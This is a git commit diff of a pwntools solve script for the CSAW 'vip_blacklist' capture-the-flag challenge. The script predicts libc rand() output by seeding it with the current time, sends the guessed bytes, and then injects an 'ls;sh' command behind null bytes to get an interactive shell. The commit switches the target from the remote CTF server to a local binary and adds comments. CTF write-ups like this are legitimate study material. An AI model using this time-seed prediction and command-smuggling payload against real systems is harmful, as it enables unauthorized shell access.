ec0c869ac6dcd4191baa27c0ac6d381006729d94
citadelhack <147342219+citadelhack@users.noreply.github.com>
2024-09-18 21:43:50 -0400

    Update solve.py

--- LocalWriteups/CSAW/vip_blacklist/solve.py
+++ LocalWriteups/CSAW/vip_blacklist/solve.py
@@ -1,30 +1,32 @@
 from ctypes import CDLL
 from math import floor
 import time
-import os
 from pwn import *
 
+#Set up the libc for srand() and rand()
 libc = CDLL("libc.so.6")
 
 
 context.log_level = 'debug'
-#p = process("vip_blacklist")
-p = remote("vip-blacklist.ctf.csaw.io", 9999)
+p = process("vip_blacklist")
 
+#Seed rand() with srand()
 now = int(floor(time.time()))
 libc.srand(now)
 
-vip = bytearray(10)
-    
+#Create the random bytes
+vip = bytearray(10)    
 for i in range(10):
     vip[i] = libc.rand() % 256
 
-sleep(1)
+#Send the payload
 p.sendline(bytes(vip))
-sleep(1)
 p.sendline(b"queue\0clear\0exit\0\0ls;sh\0")
+p.sendline(b"ls;sh")
+#This will also work locally but the server connection dropped input after the newline
 #p.sendline(b"queue\nclear\0exit\0\0ls;sh\0")
 
-context.newline = b"\r\n"
+#This was necessary on the server, but local you won't need it
+#context.newline = b"\r\n"
 
 p.interactive()
